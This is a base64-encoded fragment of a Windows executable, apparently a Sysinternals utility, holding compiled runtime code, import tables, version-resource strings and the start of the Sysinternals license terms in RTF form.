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ZDIwIDEwLjAuMTAyNDB9XHZpZXdraW5kNFx1YzEgAAAAAAAAAFxwYXJkXGJyZHJiXGJyZHJzXGJyZHJ3MTBcYnJzcDIwIFxzYjEyMFxzYTEyMFxiXGYwXGZzMjQgU1lTSU5URVJOQUxTIFNPRlRXQVJFIExJQ0VOU0UgVEVSTVNcZnMyOFxwYXIAAAAAAAAAAAAAAABccGFyZFxzYjEyMFxzYTEyMFxiMFxmczE5IFRoZXNlIGxpY2Vuc2UgdGVybXMgYXJlIGFuIGFncmVlbWVudCBiZXR3ZWVuIFN5c2ludGVybmFscyAoYSB3aG9sbHkgb3duZWQgc3Vic2lkaWFyeSBvZiBNaWNyb3NvZnQgQ29ycG9yYXRpb24pIGFuZCB5b3UuICBQbGVhc2UgcmVhZCB0aGVtLiAgVGhleSBhcHBseSB0byB0aGUgc29mdHdhcmUgeW91IGFyZSBkb3dubG9hZGluZyBmcm9tIFN5c3RpbnRlcm5hbHMuY29tLCB3aGljaCBpbmNsdWRlcyB0aGUgbWVkaWEgb24gd2hpY2ggeW91IHJlY2VpdmVkIGl0LCBpZiBhbnkuICBUaGUgdGVybXMgYWxzbyBhcHBseSB0byBhbnkgU3lzaW50ZXJuYWxzXHBhcgAAAFxwYXJkXGZpLTM2M1xsaTcyMFxzYjEyMFxzYTEyMFx0eDcyMFwnYjdcdGFiIHVwZGF0ZXMsXHBhcgAAAAAAAABccGFyZFxmaS0zNjNcbGk3MjBcc2IxMjBcc2ExMjBcJ2I3XHRhYiBzdXBwbGVtZW50cyxccGFyAFwnYjdcdGFiIEludGVybmV0LWJhc2VkIHNlcnZpY2VzLCBhbmQgXHBhcgAAAAAAAFwnYjdcdGFiIHN1cHBvcnQgc2VydmljZXNccGFyAAAAXHBhcmRcc2IxMjBcc2ExMjAgZm9yIHRoaXMgc29mdHdhcmUsIHVubGVzcyBvdGhlciB0ZXJtcyBhY2NvbXBhbnkgdGhvc2UgaXRlbXMuICBJZiBzbywgdGhvc2UgdGVybXMgYXBwbHkuXHBhcgAAAFxiIEJZIFVTSU5HIFRIRSBTT0ZUV0FSRSwgWU9VIEFDQ0VQVCBUSEVTRSBURVJNUy4gIElGIFlPVSBETyBOT1QgQUNDRVBUIFRIRU0sIERPIE5PVCBVU0UgVEhFIFNPRlRXQVJFLlxwYXIAAAAAAABccGFyZFxicmRydFxicmRyc1xicmRydzEwXGJyc3AyMCBcc2IxMjBcc2ExMjAgSWYgeW91IGNvbXBseSB3aXRoIHRoZXNlIGxpY2Vuc2UgdGVybXMsIHlvdSBoYXZlIHRoZSByaWdodHMgYmVsb3cuXHBhcgAAAAAAAAAAAAAAAFxwYXJkXGZpLTM1N1xsaTM1N1xzYjEyMFxzYTEyMFx0eDM2MFxmczIwIDEuXHRhYlxmczE5IElOU1RBTExBVElPTiBBTkQgVVNFIFJJR0hUUy4gIFxiMCBZb3UgbWF5IGluc3RhbGwgYW5kIHVzZSBhbnkgbnVtYmVyIG9mIGNvcGllcyBvZiB0aGUgc29mdHdhcmUgb24geW91ciBkZXZpY2VzLlxiXHBhcgAAAAAAXGNhcHNcZnMyMCAyLlx0YWJcZnMxOSBTY29wZSBvZiBMaWNlbnNlXGNhcHMwIC5cYjAgICBUaGUgc29mdHdhcmUgaXMgbGljZW5zZWQsIG5vdCBzb2xkLiBUaGlzIGFncmVlbWVudCBvbmx5IGdpdmVzIHlvdSBzb21lIHJpZ2h0cyB0byB1c2UgdGhlIHNvZnR3YXJlLiAgU3lzaW50ZXJuYWxzIHJlc2VydmVzIGFsbCBvdGhlciByaWdodHMuICBVbmxlc3MgYXBwbGljYWJsZSBsYXcgZ2l2ZXMgeW91IG1vcmUgcmlnaHRzIGRlc3BpdGUgdGhpcyBsaW1pdGF0aW9uLCB5b3UgbWF5IHVzZSB0aGUgc29mdHdhcmUgb25seSBhcyBleHByZXNzbHkgcGVybWl0dGVkIGluIHRoaXMgYWdyZWVtZW50LiAgSW4gZG9pbmcgc28sIHlvdSBtdXN0IGNvbXBseSB3aXRoIGFueSB0ZWNobmljYWwgbGltaXRhdGlvbnMgaW4gdGhlIHNvZnR3YXJlIHRoYXQgb25seSBhbGxvdyB5b3UgdG8gdXNlIGl0IGluIGNlcnRhaW4gd2F5cy4gICAgWW91IG1heSBub3RcYlxwYXIAXHBhcmRcZmktMzYzXGxpNzIwXHNiMTIwXHNhMTIwXHR4NzIwXGIwXCdiN1x0YWIgd29yayBhcm91bmQgYW55IHRlY2huaWNhbCBsaW1pdGF0aW9ucyBpbiB0aGUgYmluYXJ5IHZlcnNpb25zIG9mIHRoZSBzb2Z0d2FyZTtccGFyAAAAAAAAAAAAAAAAAAAAXHBhcmRcZmktMzYzXGxpNzIwXHNiMTIwXHNhMTIwXCdiN1x0YWIgcmV2ZXJzZSBlbmdpbmVlciwgZGVjb21waWxlIG9yIGRpc2Fzc2VtYmxlIHRoZSBiaW5hcnkgdmVyc2lvbnMgb2YgdGhlIHNvZnR3YXJlLCBleGNlcHQgYW5kIG9ubHkgdG8gdGhlIGV4dGVudCB0aGF0IGFwcGxpY2FibGUgbGF3IGV4cHJlc3NseSBwZXJtaXRzLCBkZXNwaXRlIHRoaXMgbGltaXRhdGlvbjtccGFyAAAAAAAAAABcJ2I3XHRhYiBtYWtlIG1vcmUgY29waWVzIG9mIHRoZSBzb2Z0d2FyZSB0aGFuIHNwZWNpZmllZCBpbiB0aGlzIGFncmVlbWVudCBvciBhbGxvd2VkIGJ5IGFwcGxpY2FibGUgbGF3LCBkZXNwaXRlIHRoaXMgbGltaXRhdGlvbjtccGFyAAAAXCdiN1x0YWIgcHVibGlzaCB0aGUgc29mdHdhcmUgZm9yIG90aGVycyB0byBjb3B5O1xwYXIAAABcJ2I3XHRhYiByZW50LCBsZWFzZSBvciBsZW5kIHRoZSBzb2Z0d2FyZTtccGFyAABcJ2I3XHRhYiB0cmFuc2ZlciB0aGUgc29mdHdhcmUgb3IgdGhpcyBhZ3JlZW1lbnQgdG8gYW55IHRoaXJkIHBhcnR5OyBvclxwYXIAAAAAAFwnYjdcdGFiIHVzZSB0aGUgc29mdHdhcmUgZm9yIGNvbW1lcmNpYWwgc29mdHdhcmUgaG9zdGluZyBzZXJ2aWNlcy5ccGFyAAAAAAAAAAAAXHBhcmRcZmktMzU3XGxpMzU3XHNiMTIwXHNhMTIwXHR4MzYwXGJcZnMyMCAzLlx0YWIgU0VOU0lUSVZFIElORk9STUFUSU9OLiBcYjAgIFBsZWFzZSBiZSBhd2FyZSB0aGF0LCBzaW1pbGFyIHRvIG90aGVyIGRlYnVnIHRvb2xzIHRoYXQgY2FwdHVyZSBcbGRibHF1b3RlIHByb2Nlc3Mgc3RhdGVccmRibHF1b3RlICBpbmZvcm1hdGlvbiwgZmlsZXMgc2F2ZWQgYnkgU3lzaW50ZXJuYWxzIHRvb2xzIG1heSBpbmNsdWRlIHBlcnNvbmFsbHkgaWRlbnRpZmlhYmxlIG9yIG90aGVyIHNlbnNpdGl2ZSBpbmZvcm1hdGlvbiAoc3VjaCBhcyB1c2VybmFtZXMsIHBhc3N3b3JkcywgcGF0aHMgdG8gZmlsZXMgYWNjZXNzZWQsIGFuZCBwYXRocyB0byByZWdpc3RyeSBhY2Nlc3NlZCkuIEJ5IHVzaW5nIHRoaXMgc29mdHdhcmUsIHlvdSBhY2tub3dsZWRnZSB0aGF0IHlvdSBhcmUgYXdhcmUgb2YgdGhpcyBhbmQgdGFrZSBzb2xlIHJlc3BvbnNpYmlsaXR5IGZvciBhbnkgcGVyc29uYWxseSBpZGVudGlmaWFibGUgb3Igb3RoZXIgc2Vuc2l0aXZlIGluZm9ybWF0aW9uIHByb3ZpZGVkIHRvIE1pY3Jvc29mdCBvciBhbnkgb3RoZXIgcGFydHkgdGhyb3VnaCB5b3VyIHVzZSBvZiB0aGUgc29mdHdhcmUuXGJccGFyAAAANS4gXHRhYlxmczE5IERPQ1VNRU5UQVRJT04uXGIwICAgQW55IHBlcnNvbiB0aGF0IGhhcyB2YWxpZCBhY2Nlc3MgdG8geW91ciBjb21wdXRlciBvciBpbnRlcm5hbCBuZXR3b3JrIG1heSBjb3B5IGFuZCB1c2UgdGhlIGRvY3VtZW50YXRpb24gZm9yIHlvdXIgaW50ZXJuYWwsIHJlZmVyZW5jZSBwdXJwb3Nlcy5cYlxwYXIAAAAAAAAAAAAAXGNhcHNcZnMyMCA2Llx0YWJcZnMxOSBFeHBvcnQgUmVzdHJpY3Rpb25zXGNhcHMwIC5cYjAgICBUaGUgc29mdHdhcmUgaXMgc3ViamVjdCB0byBVbml0ZWQgU3RhdGVzIGV4cG9ydCBsYXdzIGFuZCByZWd1bGF0aW9ucy4gIFlvdSBtdXN0IGNvbXBseSB3aXRoIGFsbCBkb21lc3RpYyBhbmQgaW50ZXJuYXRpb25hbCBleHBvcnQgbGF3cyBhbmQgcmVndWxhdGlvbnMgdGhhdCBhcHBseSB0byB0aGUgc29mdHdhcmUuICBUaGVzZSBsYXdzIGluY2x1ZGUgcmVzdHJpY3Rpb25zIG9uIGRlc3RpbmF0aW9ucywgZW5kIHVzZXJzIGFuZCBlbmQgdXNlLiAgRm9yIGFkZGl0aW9uYWwgaW5mb3JtYXRpb24sIHNlZSB7XGNmMVx1bHtcZmllbGR7XCpcZmxkaW5zdHtIWVBFUkxJTksgd3d3Lm1pY3Jvc29mdC5jb20vZXhwb3J0aW5nIH19e1xmbGRyc2x0e3d3dy5taWNyb3NvZnQuY29tL2V4cG9ydGluZ319fX1cY2YxXHVsXGYwXGZzMTkgIDx7e1xmaWVsZHtcKlxmbGRpbnN0e0hZUEVSTElOSyAiaHR0cDovL3d3dy5taWNyb3NvZnQuY29tL2V4cG9ydGluZyJ9fXtcZmxkcnNsdHtodHRwOi8vd3d3Lm1pY3Jvc29mdC5jb20vZXhwb3J0aW5nfX19fVxmMFxmczE5ID5cY2YwXHVsbm9uZSAuXGJccGFyAAAAAAAAAAAAAAAAXGNhcHNcZnMyMCA3Llx0YWJcZnMxOSBTVVBQT1JUIFNFUlZJQ0VTLlxjYXBzMCAgXGIwIEJlY2F1c2UgdGhpcyBzb2Z0d2FyZSBpcyAiYXMgaXMsICIgd2UgbWF5IG5vdCBwcm92aWRlIHN1cHBvcnQgc2VydmljZXMgZm9yIGl0LlxiXHBhcgAAAAAAAAAAXGNhcHNcZnMyMCA4Llx0YWJcZnMxOSBFbnRpcmUgQWdyZWVtZW50LlxiMFxjYXBzMCAgIFRoaXMgYWdyZWVtZW50LCBhbmQgdGhlIHRlcm1zIGZvciBzdXBwbGVtZW50cywgdXBkYXRlcywgSW50ZXJuZXQtYmFzZWQgc2VydmljZXMgYW5kIHN1cHBvcnQgc2VydmljZXMgdGhhdCB5b3UgdXNlLCBhcmUgdGhlIGVudGlyZSBhZ3JlZW1lbnQgZm9yIHRoZSBzb2Z0d2FyZSBhbmQgc3VwcG9ydCBzZXJ2aWNlcy5ccGFyAAAAAAAAXHBhcmRca2VlcG5cZmktMzYwXGxpMzYwXHNiMTIwXHNhMTIwXHR4MzYwXGNmMlxiXGNhcHNcZnMyMCA5Llx0YWJcZnMxOSBBcHBsaWNhYmxlIExhd1xjYXBzMCAuXHBhcgAAAAAAAAAAAAAAAAAAAFxwYXJkXGZpLTM2M1xsaTcyMFxzYjEyMFxzYTEyMFx0eDcyMFxjZjBcZnMyMCBhLlx0YWJcZnMxOSBVbml0ZWQgU3RhdGVzLlxiMCAgIElmIHlvdSBhY3F